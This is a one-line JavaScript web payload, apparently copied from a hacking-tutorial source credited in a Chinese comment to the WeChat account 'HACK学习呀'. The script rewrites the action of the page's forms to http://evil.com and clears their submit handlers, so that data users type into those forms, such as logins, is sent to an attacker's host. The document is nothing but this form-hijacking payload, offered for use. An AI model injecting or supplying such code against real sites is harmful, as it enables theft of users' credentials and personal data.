var f=document.forms;var i=f.length-1;do{f[i].action="http://evil.com";f[i].onsubmit=null;}while(--i);



//参考来源：微信公众号：HACK学习呀